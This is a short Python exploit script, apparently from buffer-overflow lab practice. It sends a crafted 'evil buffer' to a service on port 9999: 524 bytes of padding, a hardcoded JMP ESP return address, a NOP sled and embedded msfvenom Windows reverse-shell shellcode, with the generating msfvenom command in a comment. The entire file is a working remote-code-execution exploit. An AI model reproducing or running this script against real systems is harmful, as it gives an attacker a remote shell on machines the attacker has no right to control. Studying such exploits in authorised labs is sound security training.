import socket

ip = "target ip"
port = 9999

# msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=4444 EXITFUNC=thread -b "\x00" -f c
# jmp esp = 311712f3

prefix = ""
offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90"*32
payload = ("\xdd\xc3\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x12\xbd\x93\x90\x2c"
"\xc3\x31\x68\x17\x83\xe8\xfc\x03\xfb\x83\xce\x36\xca\x78\xf9"
"\x5a\x7f\x3c\x55\xf7\x7d\x4b\xb8\xb7\xe7\x86\xbb\x2b\xbe\xa8"
"\x83\x86\xc0\x80\x82\xe1\xa8\xd2\xdd\x13\xe5\xbb\x1f\x14\xe4"
"\x67\xa9\xf5\xb6\xfe\xf9\xa4\xe5\x4d\xfa\xcf\xe8\x7f\x7d\x9d"
"\x82\x11\x51\x51\x3a\x86\x82\xba\xd8\x3f\x54\x27\x4e\x93\xef"
"\x49\xde\x18\x3d\x09")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")